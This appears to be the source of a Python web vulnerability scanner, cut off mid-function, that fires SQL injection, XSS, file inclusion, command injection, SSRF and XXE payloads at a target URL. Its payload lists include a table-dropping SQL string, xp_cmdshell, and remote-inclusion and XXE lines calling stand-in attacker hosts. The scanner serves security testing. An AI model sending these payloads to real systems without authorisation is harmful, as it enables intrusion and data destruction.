#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Copyright (c) 2020 - 2025 ABN BOOS
# VulnScanX - Comprehensive Security Scanner

import sys
import os
import argparse
import json
import threading
import time
import re
import random
from urllib.parse import urlparse
import requests
import ssl
from pathlib import Path

# SSL settings
try:
    ssl._create_default_https_context = ssl._create_unverified_context
except:
    pass

class Logger:
    """Logger class for consistent output formatting"""
    
    # Colors and formatting
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
    @classmethod
    def info(cls, message):
        print(f"{cls.CYAN}[INFO]{cls.END} {message}")
    
    @classmethod
    def success(cls, message):
        print(f"{cls.GREEN}[SUCCESS]{cls.END} {message}")
    
    @classmethod
    def warning(cls, message):
        print(f"{cls.YELLOW}[WARNING]{cls.END} {message}")
    
    @classmethod
    def error(cls, message):
        print(f"{cls.RED}[ERROR]{cls.END} {message}")
    
    @classmethod
    def result(cls, message, details=""):
        print(f"{cls.MAGENTA}[RESULT]{cls.END} {message}")
        if details:
            print(f"    {details}")

class CMSDatabase:
    """CMS Database with advanced detection patterns"""
    
    def __init__(self):
        self.cms_list = self.load_cms_database()
        self.vulnerability_db = self.load_vulnerability_database()
    
    def load_cms_database(self):
        """Load CMS database with multiple CMS patterns"""
        cms_db = {
            'wordpress': {
                'patterns': [
                    r'wp-content', r'wp-includes', r'wp-json', 
                    r'wordpress', r'/wp-admin/', r'content="WordPress'
                ],
                'version_patterns': [
                    r'content="WordPress (\d+\.\d+\.\d+)',
                    r'<meta name="generator" content="WordPress (\d+\.\d+\.\d+)'
                ],
                'files': [
                    '/wp-login.php', '/wp-admin/', '/readme.html',
                    '/wp-config.php', '/xmlrpc.php'
                ]
            },
            'joomla': {
                'patterns': [
                    r'joomla', r'Joomla', r'/media/jui/', r'/media/system/',
                    r'content="Joomla', r'index.php?option=com_'
                ],
                'version_patterns': [
                    r'content="Joomla!? (\d+\.\d+\.\d+)',
                    r'Joomla!? (\d+\.\d+\.\d+)'
                ],
                'files': [
                    '/administrator/', '/configuration.php',
                    '/joomla.xml', '/images/joomla.png'
                ]
            },
            'drupal': {
                'patterns': [
                    r'Drupal', r'drupal', r'sites/all/', r'/sites/default/',
                    r'content="Drupal', r'/misc/drupal.js'
                ],
                'version_patterns': [
                    r'content="Drupal (\d+\.\d+)',
                    r'Drupal (\d+\.\d+)'
                ],
                'files': [
                    '/sites/default/settings.php',
                    '/update.php', '/install.php'
                ]
            },
            'magento': {
                'patterns': [
                    r'Magento', r'magento', r'/skin/frontend/',
                    r'/static/frontend/', r'var/version'
                ],
                'version_patterns': [
                    r'Magento/(\d+\.\d+)',
                    r'Magento_(\d+\.\d+)'
                ],
                'files': [
                    '/admin/', '/downloader/'
                ]
            }
        }
        return cms_db
    
    def load_vulnerability_database(self):
        """Load vulnerability database"""
        vuln_db = {
            'wordpress': {
                'core': {},
                'plugins': {},
                'themes': {}
            },
            'joomla': {
                'core': {},
                'extensions': {}
            },
            'drupal': {
                'core': {},
                'modules': {}
            }
        }
        
        db_path = Path('vulnerability_db.json')
        if db_path.exists():
            try:
                with open(db_path, 'r', encoding='utf-8') as f:
                    external_db = json.load(f)
                    for cms, data in external_db.items():
                        if cms in vuln_db:
                            vuln_db[cms].update(data)
            except (json.JSONDecodeError, IOError):
                pass
                
        return vuln_db

class AdvancedCMSDetector:
    """Advanced CMS Detection Engine"""
    
    def __init__(self):
        self.logger = Logger()
        self.cms_db = CMSDatabase()
    
    def get_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        ]
        return random.choice(user_agents)
    
    def get_page_source(self, url):
        """Get page source with headers"""
        try:
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            response = requests.get(url, timeout=15, verify=False, headers=headers)
            return response.text, response.headers, response.status_code
        except requests.RequestException as e:
            self.logger.error(f"Failed to fetch page: {e}")
            return None, None, None
    
    def detect_from_headers(self, headers):
        """Detect CMS from HTTP headers"""
        cms_indicators = {
            'x-powered-by': {
                'wordpress': ['wordpress', 'wp'],
                'joomla': ['joomla'],
                'drupal': ['drupal'],
                'magento': ['magento']
            },
            'server': {
                'wordpress': ['wordpress'],
                'joomla': ['joomla'],
                'drupal': ['drupal']
            }
        }
        
        for header_name, patterns in cms_indicators.items():
            if header_name in headers:
                header_value = headers[header_name].lower()
                for cms, indicators in patterns.items():
                    if any(indicator in header_value for indicator in indicators):
                        return cms
        return None
    
    def detect_from_source(self, source):
        """Advanced CMS detection from page source"""
        detected_cms = []
        
        for cms_name, cms_data in self.cms_db.cms_list.items():
            confidence = 0
            version = 'Unknown'
            
            for pattern in cms_data['patterns']:
                if re.search(pattern, source, re.IGNORECASE):
                    confidence += 1
            
            if confidence > 0:
                version = self.detect_version(cms_name, source)
                if version != 'Unknown':
                    confidence += 1
                
                detected_cms.append({
                    'name': cms_name.title(),
                    'version': version,
                    'confidence': 'High' if confidence >= 2 else 'Medium'
                })
        
        detected_cms.sort(key=lambda x: x['confidence'], reverse=True)
        return detected_cms
    
    def detect_version(self, cms_name, source):
        """Detect CMS version from source"""
        if cms_name in self.cms_db.cms_list:
            version_patterns = self.cms_db.cms_list[cms_name]['version_patterns']
            for pattern in version_patterns:
                match = re.search(pattern, source, re.IGNORECASE)
                if match:
                    return match.group(1)
        return 'Unknown'
    
    def cms_file_scan(self, target, cms_name):
        """Scan for CMS-specific files"""
        if cms_name.lower() not in self.cms_db.cms_list:
            return []
        
        vulnerabilities = []
        cms_files = self.cms_db.cms_list[cms_name.lower()].get('files', [])
        
        for cms_file in cms_files:
            test_url = target.rstrip('/') + cms_file
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': f'{cms_name} File Exposure',
                        'severity': 'Medium',
                        'description': f'{cms_name} file accessible: {cms_file}',
                        'url': test_url,
                        'fix': f'Restrict access to {cms_name} files'
                    })
            except requests.RequestException:
                continue
                
        return vulnerabilities

class VulnScanX:
    def __init__(self):
        self.version = "2.1.0"
        self.logger = Logger()
        self.cms_detector = AdvancedCMSDetector()
        self.cms_db = CMSDatabase()
        self.threads = []
        self.results = {}
        
    def display_logo(self):
        """Display the new application logo"""
        logo = f"""
{Logger.CYAN}{Logger.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗   ██╗██╗   ██╗██╗     ███████╗███╗   ██╗███████╗     ║
║    ██║   ██║██║   ██║██║     ██╔════╝████╗  ██║██╔════╝     ║
║    ██║   ██║██║   ██║██║     ███████╗██╔██╗ ██║███████╗     ║
║    ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║╚██╗██║╚════██║     ║
║     ╚████╔╝ ╚██████╔╝███████╗███████║██║ ╚████║███████║     ║
║      ╚═══╝   ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝     ║
║                                                              ║
║    ╔════════════════════════════════════════════════════╗    ║
║    ║                  VULNSCANX                        ║    ║
║    ║           SECURITY SCANNING SUITE                 ║    ║
║    ║              Version 2.1.0                        ║    ║
║    ╚════════════════════════════════════════════════════╝    ║
║                                                              ║
║    ┌────────────────────────────────────────────────────┐    ║
║    │  🔍 CMS Detection    │   🛡️ Security Headers    │    ║
║    │  💉 SQL Injection    │   🎯 XSS Testing        │    ║
║    │  📊 Vulnerability Scan │   📁 File Exposure     │    ║
║    └────────────────────────────────────────────────────┘    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Logger.END}
        """
        print(logo)
        
    def display_banner(self):
        """Display new welcome banner"""
        banner = f"""
{Logger.GREEN}{Logger.BOLD}
┌─────────────────────────────────────────────────────────────┐
│                   VULNSCANX v2.1.0                         │
│           Comprehensive Security Scanner                    │
│        Advanced Threat Detection & Analysis                 │
└─────────────────────────────────────────────────────────────┘
{Logger.END}
{Logger.CYAN}
 Features: CMS Detection • SQLi Scanner • XSS Testing • Header Analysis
{Logger.END}
    """
        print(banner)

    def process_url(self, url):
        """Process and validate URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                self.logger.error(f"Invalid URL: {url}")
                return None
            return url
        except Exception as e:
            self.logger.error(f"URL parsing error: {e}")
            return None

    def advanced_cms_detection(self, target):
        """Advanced CMS detection"""
        self.logger.info("Starting advanced CMS detection...")
        
        source, headers, status_code = self.cms_detector.get_page_source(target)
        if not source:
            return {'name': 'Unknown', 'version': 'Unknown', 'confidence': 'Failed'}
        
        cms_from_headers = self.cms_detector.detect_from_headers(headers)
        cms_from_source = self.cms_detector.detect_from_source(source)
        
        if cms_from_source:
            return cms_from_source[0]
        elif cms_from_headers:
            return {'name': cms_from_headers.title(), 'version': 'Unknown', 'confidence': 'Medium'}
        else:
            return {'name': 'Unknown', 'version': 'Unknown', 'confidence': 'Low'}

    def display_cms_info(self, cms_info):
        """Display CMS detection results"""
        if cms_info['name'] != 'Unknown':
            version_text = f" {Logger.CYAN}v{cms_info['version']}{Logger.END}" if cms_info['version'] != 'Unknown' else ""
            confidence_color = Logger.GREEN if cms_info['confidence'] == 'High' else Logger.YELLOW
            self.logger.success(f"Detected: {Logger.BOLD}{cms_info['name']}{version_text}{Logger.END} "
                              f"({confidence_color}{cms_info['confidence']} confidence{Logger.END})")
        else:
            self.logger.warning("No CMS detected or CMS is unknown")

    def wordpress_scan(self, target):
        """Advanced WordPress scanning"""
        self.logger.info("Starting WordPress-specific scan...")
        
        wp_vulnerabilities = []
        wp_files = [
            '/wp-admin/', '/wp-login.php', '/wp-content/uploads/',
            '/xmlrpc.php', '/wp-config.php', '/readme.html',
            '/wp-includes/rss-functions.php', '/wp-admin/install.php'
        ]
        
        for wp_file in wp_files:
            test_url = target.rstrip('/') + wp_file
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    if wp_file == '/wp-config.php':
                        wp_vulnerabilities.append({
                            'type': 'WordPress Config Exposure',
                            'severity': 'Critical',
                            'description': f'WordPress configuration file accessible: {wp_file}',
                            'url': test_url,
                            'fix': 'Restrict access to wp-config.php and move it to upper directory'
                        })
                    elif wp_file == '/wp-admin/install.php':
                        wp_vulnerabilities.append({
                            'type': 'WordPress Install File Exposure',
                            'severity': 'High',
                            'description': f'WordPress install file accessible: {wp_file}',
                            'url': test_url,
                            'fix': 'Remove install.php after installation'
                        })
                    else:
                        wp_vulnerabilities.append({
                            'type': 'WordPress File Exposure',
                            'severity': 'Medium',
                            'description': f'WordPress file accessible: {wp_file}',
                            'url': test_url,
                            'fix': 'Implement proper file permissions and .htaccess rules'
                        })
            except requests.RequestException:
                continue
                
        return wp_vulnerabilities

    def joomla_scan(self, target):
        """Advanced Joomla scanning"""
        self.logger.info("Starting Joomla-specific scan...")
        
        joomla_vulnerabilities = []
        joomla_files = [
            '/administrator/', '/configuration.php', '/joomla.xml',
            '/web.config.txt', '/htaccess.txt', '/README.txt'
        ]
        
        for joomla_file in joomla_files:
            test_url = target.rstrip('/') + joomla_file
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    if joomla_file == '/configuration.php':
                        joomla_vulnerabilities.append({
                            'type': 'Joomla Config Exposure',
                            'severity': 'Critical',
                            'description': f'Joomla configuration file accessible: {joomla_file}',
                            'url': test_url,
                            'fix': 'Restrict access to configuration.php'
                        })
                    else:
                        joomla_vulnerabilities.append({
                            'type': 'Joomla File Exposure',
                            'severity': 'Medium',
                            'description': f'Joomla file accessible: {joomla_file}',
                            'url': test_url,
                            'fix': 'Implement proper file permissions'
                        })
            except requests.RequestException:
                continue
                
        return joomla_vulnerabilities

    def drupal_scan(self, target):
        """Drupal-specific vulnerability scanning"""
        vulnerabilities = []
        self.logger.info("Starting Drupal-specific scan...")
        
        drupal_files = [
            '/sites/default/settings.php',
            '/update.php',
            '/install.php',
            '/cron.php',
            '/xmlrpc.php'
        ]
        
        for drupal_file in drupal_files:
            test_url = target.rstrip('/') + drupal_file
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    if 'settings.php' in drupal_file:
                        vulnerabilities.append({
                            'type': 'Drupal Config Exposure',
                            'severity': 'Critical',
                            'description': f'Drupal configuration file accessible: {drupal_file}',
                            'url': test_url,
                            'fix': 'Restrict access to settings.php file'
                        })
                    else:
                        vulnerabilities.append({
                            'type': 'Drupal File Exposure',
                            'severity': 'Medium',
                            'description': f'Drupal file accessible: {drupal_file}',
                            'url': test_url,
                            'fix': 'Implement proper file permissions'
                        })
            except requests.RequestException:
                continue
                
        return vulnerabilities

    def advanced_sql_scan(self, target):
        """Advanced SQL Injection scanning with multiple techniques"""
        vulnerabilities = []
        self.logger.info("Starting advanced SQL injection scan...")
        
        # Comprehensive SQL payloads
        sql_payloads = [
            # Basic SQL injection
            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR '1'='1' #",
            "' OR 1=1 #",
            
            # Union-based
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,@@version,3 --",
            "' UNION SELECT 1,database(),3 --",
            
            # Error-based
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version)) --",
            
            # Boolean-based
            "' AND 1=1 --",
            "' AND 1=2 --",
            
            # Time-based
            "' AND SLEEP(5) --",
            "' ; WAITFOR DELAY '00:00:05' --",
            
            # Stacked queries
            "'; DROP TABLE users --",
            "'; EXEC xp_cmdshell('dir') --"
        ]
        
        test_params = ['id', 'page', 'category', 'product', 'user', 'search', 'q', 'post', 'article']
        
        for param in test_params:
            tested_urls = set()
            
            for payload in sql_payloads:
                test_url = f"{target}?{param}={requests.utils.quote(payload)}"
                
                if test_url in tested_urls:
                    continue
                tested_urls.add(test_url)
                
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False, headers=headers)
                    response_time = time.time() - start_time
                    
                    content_lower = response.text.lower()
                    
                    # SQL error patterns
                    sql_errors = {
                        'mysql': ['mysql', 'mysqli', 'you have an error in your sql syntax'],
                        'mssql': ['microsoft odbc', 'sql server', 'procedure', 'line'],
                        'oracle': ['ora-', 'oracle', 'pl/sql'],
                        'postgresql': ['postgresql', 'pg_'],
                        'generic': ['sql syntax', 'database error', 'warning:', 'unclosed quotation']
                    }
                    
                    # Check for SQL errors
                    for db_type, errors in sql_errors.items():
                        if any(error in content_lower for error in errors):
                            vulnerabilities.append({
                                'type': f'SQL Injection ({db_type.upper()})',
                                'severity': 'High',
                                'description': f'Potential SQL Injection in parameter: {param}',
                                'url': test_url,
                                'payload': payload,
                                'fix': 'Use parameterized queries and input validation'
                            })
                            break
                    
                    # Check for time-based SQLi
                    if response_time > 5:  # If response takes more than 5 seconds
                        vulnerabilities.append({
                            'type': 'Time-Based SQL Injection',
                            'severity': 'High', 
                            'description': f'Time-based SQL Injection in parameter: {param}',
                            'url': test_url,
                            'payload': payload,
                            'response_time': f'{response_time:.2f}s',
                            'fix': 'Use parameterized queries and input validation'
                        })
                    
                    # Check for boolean-based differences
                    true_payload = f"{target}?{param}=1' AND '1'='1"
                    false_payload = f"{target}?{param}=1' AND '1'='2"
                    
                    true_response = requests.get(true_payload, timeout=5, verify=False, headers=headers)
                    false_response = requests.get(false_payload, timeout=5, verify=False, headers=headers)
                    
                    if true_response.text != false_response.text:
                        vulnerabilities.append({
                            'type': 'Boolean-Based SQL Injection',
                            'severity': 'High',
                            'description': f'Boolean-based SQL Injection in parameter: {param}',
                            'url': test_url,
                            'fix': 'Use parameterized queries and input validation'
                        })
                            
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def advanced_xss_scan(self, target):
        """Advanced XSS scanning with multiple contexts"""
        vulnerabilities = []
        self.logger.info("Starting advanced XSS scan...")
        
        # Comprehensive XSS payloads for different contexts
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            
            # Without script tags
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            
            # Event handlers
            "\" onmouseover=\"alert(1)",
            "' onfocus='alert(1)",
            " onload=\"alert(1)\"",
            
            # JavaScript URIs
            "javascript:alert(1)",
            "jAvAsCrIpT:alert(1)",
            
            # Encoding variations
            "<scr<script>ipt>alert(1)</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            
            # Advanced vectors
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
        ]
        
        test_params = ['q', 'search', 'query', 'name', 'email', 'message', 'comment', 'title', 'url']
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{target}?{param}={requests.utils.quote(payload)}"
                
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    response = requests.get(test_url, timeout=8, verify=False, headers=headers)
                    
                    # Check if payload is reflected without proper encoding
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'severity': 'Medium',
                            'description': f'Reflected XSS in parameter: {param}',
                            'url': test_url,
                            'payload': payload,
                            'fix': 'Implement proper input sanitization and output encoding'
                        })
                        break
                        
                    # Check for DOM-based XSS indicators
                    if any(indicator in response.text for indicator in ['eval(', 'innerHTML', 'document.write', 'setTimeout']):
                        if any(xss_indicator in response.text for xss_indicator in [param, payload.split('<')[0] if '<' in payload else payload]):
                            vulnerabilities.append({
                                'type': 'Potential DOM-Based XSS',
                                'severity': 'Medium', 
                                'description': f'Potential DOM-based XSS in parameter: {param}',
                                'url': test_url,
                                'fix': 'Avoid using eval() and innerHTML with user input'
                            })
                            
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def lfi_scan(self, target):
        """Local File Inclusion scanning"""
        vulnerabilities = []
        self.logger.info("Starting LFI/RFI scan...")
        
        lfi_payloads = [
            # Basic LFI
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../windows/win.ini",
            
            # Encoded variations
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc//passwd",
            
            # Null byte injection
            "../../../../etc/passwd%00",
            "../../../../etc/passwd%00.txt",
            
            # RFI payloads
            "http://evil.com/shell.txt",
            "https://attacker.com/backdoor.php"
        ]
        
        test_params = ['file', 'page', 'path', 'include', 'load', 'template', 'view']
        
        for param in test_params:
            for payload in lfi_payloads:
                test_url = f"{target}?{param}={payload}"
                
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    response = requests.get(test_url, timeout=5, verify=False, headers=headers)
                    
                    # Check for LFI indicators
                    lfi_indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:',
                        '[boot loader]', '[fonts]', '[extensions]'
                    ]
                    
                    if any(indicator in response.text for indicator in lfi_indicators):
                        vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'description': f'LFI vulnerability in parameter: {param}',
                            'url': test_url,
                            'payload': payload,
                            'fix': 'Validate and sanitize file paths, use whitelists'
                        })
                        break
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def command_injection_scan(self, target):
        """Command Injection scanning"""
        vulnerabilities = []
        self.logger.info("Starting command injection scan...")
        
        cmd_payloads = [
            # Unix commands
            "; ls -la",
            "| whoami", 
            "&& cat /etc/passwd",
            "`id`",
            
            # Windows commands  
            "| dir",
            "&& type C:\\windows\\win.ini",
            "; ipconfig /all",
            
            # Blind command injection
            "| sleep 5",
            "&& ping -c 5 127.0.0.1",
            "; ping -n 5 127.0.0.1"
        ]
        
        test_params = ['cmd', 'command', 'exec', 'execute', 'ip', 'host', 'domain']
        
        for param in test_params:
            for payload in cmd_payloads:
                test_url = f"{target}?{param}={requests.utils.quote(payload)}"
                
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False, headers=headers)
                    response_time = time.time() - start_time
                    
                    # Check for command output
                    cmd_indicators = [
                        'root', 'daemon', 'bin', 'sys',
                        'Volume', 'Directory', '<DIR>',
                        'inet', 'eth0', 'Windows IP'
                    ]
                    
                    if any(indicator in response.text for indicator in cmd_indicators):
                        vulnerabilities.append({
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'description': f'Command injection in parameter: {param}',
                            'url': test_url,
                            'payload': payload,
                            'fix': 'Use proper input validation and avoid shell execution'
                        })
                        break
                    
                    # Check for time-based blind injection
                    if response_time > 5:
                        vulnerabilities.append({
                            'type': 'Blind Command Injection',
                            'severity': 'High',
                            'description': f'Blind command injection in parameter: {param}',
                            'url': test_url, 
                            'payload': payload,
                            'response_time': f'{response_time:.2f}s',
                            'fix': 'Use proper input validation and avoid shell execution'
                        })
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def ssrf_scan(self, target):
        """Server-Side Request Forgery scanning"""
        vulnerabilities = []
        self.logger.info("Starting SSRF scan...")
        
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306", 
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:25/xHELO%20localhost"
        ]
        
        test_params = ['url', 'link', 'image', 'file', 'path', 'redirect']
        
        for param in test_params:
            for payload in ssrf_payloads:
                test_url = f"{target}?{param}={requests.utils.quote(payload)}"
                
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    response = requests.get(test_url, timeout=8, verify=False, headers=headers)
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        'root:', 'mysql', 'ssh', 'smtp',
                        'ami-id', 'instance-type', 'local-ipv4'
                    ]
                    
                    if any(indicator in response.text for indicator in ssrf_indicators):
                        vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'description': f'SSRF vulnerability in parameter: {param}',
                            'url': test_url,
                            'payload': payload,
                            'fix': 'Validate and sanitize URLs, use allowlists for domains'
                        })
                        break
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def xxe_scan(self, target):
        """XML External Entity scanning"""
        vulnerabilities = []
        self.logger.info("Starting XXE scan...")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%init;]><root></root>'
        ]
        
        # Test endpoints that might process XML
        xml_endpoints = [
            '/api/xml',
            '/webservice',
            '/soap',
            '/rpc',
            '/xmlrpc'
        ]
        
        for endpoint in xml_endpoints:
            test_url = target.rstrip('/') + endpoint
            
            for payload in xxe_payloads:
                try:
                    headers = {
                        'User-Agent': self.cms_detector.get_user_agent(),
                        'Content-Type': 'application/xml'
                    }
                    response = requests.post(test_url, data=payload, timeout=8, verify=False, headers=headers)
                    
                    # Check for XXE indicators
                    if 'root:' in response.text and 'bin/' in response.text:
                        vulnerabilities.append({
                            'type': 'XML External Entity (XXE)',
                            'severity': 'High',
                            'description': f'XXE vulnerability at endpoint: {endpoint}',
                            'url': test_url,
                            'fix': 'Disable external entity processing in XML parser'
                        })
                        break
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def directory_bruteforce(self, target):
        """Directory and file bruteforcing"""
        vulnerabilities = []
        self.logger.info("Starting directory bruteforce...")
        
        common_directories = [
            '/admin', '/administrator', '/login', '/dashboard', '/panel',
            '/wp-admin', '/phpmyadmin', '/cpanel', '/webmail',
            '/backup', '/backups', '/old', '/temp', '/tmp',
            '/uploads', '/images', '/files', '/downloads',
            '/api', '/webservice', '/config', '/setup'
        ]
        
        common_files = [
            '/.env', '/config.php', '/settings.php', '/database.php',
            '/backup.zip', '/dump.sql', '/backup.sql',
            '/phpinfo.php', '/test.php', '/info.php',
            '/.git/config', '/.htaccess', '/web.config'
        ]
        
        # Test directories
        for directory in common_directories:
            test_url = target.rstrip('/') + directory
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Directory Listing',
                        'severity': 'Low',
                        'description': f'Directory accessible: {directory}',
                        'url': test_url,
                        'fix': 'Restrict directory access and implement authentication'
                    })
            except requests.RequestException:
                continue
        
        # Test files
        for file_path in common_files:
            test_url = target.rstrip('/') + file_path
            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Sensitive File Exposure',
                        'severity': 'High' if any(ext in file_path for ext in ['.env', '.php', 'config']) else 'Medium',
                        'description': f'Sensitive file accessible: {file_path}',
                        'url': test_url,
                        'fix': 'Remove or restrict access to sensitive files'
                    })
            except requests.RequestException:
                continue
                    
        return vulnerabilities

    def backup_file_scan(self, target):
        """Backup file scanning"""
        vulnerabilities = []
        self.logger.info("Starting backup file scan...")
        
        backup_extensions = ['.bak', '.backup', '.old', '.tmp', '.temp', '.save']
        file_names = ['index', 'admin', 'config', 'database', 'settings', 'web', 'site']
        
        for name in file_names:
            for ext in backup_extensions:
                test_url = target.rstrip('/') + f'/{name}{ext}'
                test_url2 = target.rstrip('/') + f'/{name}.php{ext}'
                
                for test_path in [test_url, test_url2]:
                    try:
                        response = requests.get(test_path, timeout=3, verify=False)
                        if response.status_code == 200:
                            vulnerabilities.append({
                                'type': 'Backup File Exposure',
                                'severity': 'Medium',
                                'description': f'Backup file found: {test_path.split("/")[-1]}',
                                'url': test_path,
                                'fix': 'Remove backup files from production environment'
                            })
                    except requests.RequestException:
                        continue
                        
        return vulnerabilities

    def advanced_security_scan(self, target):
        """Perform advanced security scanning with CMS detection"""
        self.logger.info(f"Starting advanced security scan for {target}")
        
        cms_info = self.advanced_cms_detection(target)
        
        security_report = {
            'target': target,
            'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'cms_info': cms_info,
            'vulnerabilities': [],
            'security_headers': {},
            'recommendations': []
        }
        
        self.display_cms_info(cms_info)
        
        # Start all security scans in sequence
        self.logger.info("Starting comprehensive vulnerability assessment...")
        
        # CMS-specific scans
        if cms_info['name'].lower() == 'wordpress':
            security_report['vulnerabilities'].extend(self.wordpress_scan(target))
        elif cms_info['name'].lower() == 'joomla':
            security_report['vulnerabilities'].extend(self.joomla_scan(target))
        elif cms_info['name'].lower() == 'drupal':
            security_report['vulnerabilities'].extend(self.drupal_scan(target))
        
        # Advanced security scans
        security_report['vulnerabilities'].extend(self.advanced_sql_scan(target))
        security_report['vulnerabilities'].extend(self.advanced_xss_scan(target))
        security_report['vulnerabilities'].extend(self.lfi_scan(target))
        security_report['vulnerabilities'].extend(self.command_injection_scan(target))
        security_report['vulnerabilities'].extend(self.ssrf_scan(target))
        security_report['vulnerabilities'].extend(self.xxe_scan(target))
        
        # Additional scans
        security_report['vulnerabilities'].extend(self.check_sensitive_files(target))
        security_report['vulnerabilities'].extend(self.directory_bruteforce(target))
        security_report['vulnerabilities'].extend(self.backup_file_scan(target))
        
        security_report['security_headers'] = self.check_security_headers(target)
        
        if cms_info['name'] != 'Unknown':
            security_report['vulnerabilities'].extend(
                self.cms_detector.cms_file_scan(target, cms_info['name'])
            )
        
        security_report['recommendations'] = self.generate_recommendations(security_report)
        
        return security_report

    def check_security_headers(self, target):
        """Check security headers"""
        headers_to_check = [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'X-XSS-Protection',
            'Referrer-Policy'
        ]
        
        security_headers = {}
        try:
            headers = {'User-Agent': self.cms_detector.get_user_agent()}
            response = requests.get(target, timeout=10, verify=False, headers=headers)
            for header in headers_to_check:
                security_headers[header] = response.headers.get(header, 'Missing')
            self.logger.success("Security headers check completed")
        except requests.RequestException as e:
            self.logger.error(f"Error checking security headers: {e}")
            
        return security_headers

    def scan_sql_injection(self, target):
        """Scan for SQL Injection vulnerabilities"""
        vulnerabilities = []
        test_params = ['id', 'page', 'category', 'product', 'user']
        
        self.logger.info("Starting SQL Injection scan")
        
        for param in test_params:
            test_urls = [
                f"{target}?{param}=1'",
                f"{target}?{param}=1 AND 1=1",
                f"{target}?{param}=1 AND 1=2"
            ]
            
            for test_url in test_urls:
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    response = requests.get(test_url, timeout=8, verify=False, headers=headers)
                    content_lower = response.text.lower()
                    sql_errors = [
                        'sql syntax', 'mysql_fetch', 'ora-', 
                        'microsoft odbc', 'postgresql', 'sybase', 
                        'database error'
                    ]
                    
                    if any(error in content_lower for error in sql_errors):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'description': f'Potential SQL Injection in parameter: {param}',
                            'url': test_url,
                            'fix': 'Use parameterized queries and input validation'
                        })
                        break
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def scan_xss_vulnerabilities(self, target):
